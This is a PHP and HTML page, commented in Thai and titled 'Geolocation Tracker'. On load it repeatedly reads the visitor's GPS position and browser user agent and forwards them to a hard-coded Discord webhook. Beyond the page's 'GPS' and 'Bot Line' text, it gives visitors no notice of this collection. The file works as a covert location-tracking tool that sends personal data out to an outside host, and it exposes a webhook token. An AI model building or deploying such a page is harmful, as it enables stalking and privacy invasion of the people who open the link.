<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // อ่านข้อมูล JSON ที่ส่งมาจาก JavaScript
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (isset($data['latitude']) && isset($data['longitude'])) {
        $latitude = $data['latitude'];
        $longitude = $data['longitude'];
        $userAgent = $data['userAgent'];

        // URL ของ Discord Webhook
        $webhook_url = "https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz";

        // สร้างข้อความที่ส่งไปยัง Discord
        $message = [
            'content' => "ตำแหน่งที่ตั้ง:\n- Latitude: $latitude\n- Longitude: $longitude\n- User Agent: $userAgent",
        ];

        // ส่งข้อมูลไปยัง Discord
        $options = [
            'http' => [
                'header'  => "Content-Type: application/json\r\n",
                'method'  => 'POST',
                'content' => json_encode($message),
            ],
        ];
        $context  = stream_context_create($options);
        file_get_contents($webhook_url, false, $context);

        // ตอบกลับไปยัง client
        http_response_code(200);
        echo "Location sent to Discord!";
    } else {
        http_response_code(400);
        echo "Invalid data!";
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Geolocation Tracker</title>
</head>
<body>
    <script>
        function send() {
            navigator.geolocation.getCurrentPosition(position => {
                const data = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    userAgent: navigator.userAgent
                };

                fetch('', { // ใช้ URL เดียวกัน (PHP ไฟล์นี้)
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(response => console.log("Location sent!"));
            });
        }
        setInterval(send, 1000); // ส่งข้อมูลทุก 500 มิลลิวินาที
    </script>
    <h1>GPS</h1>
    <p>Bot Line</p>
</body>
</html>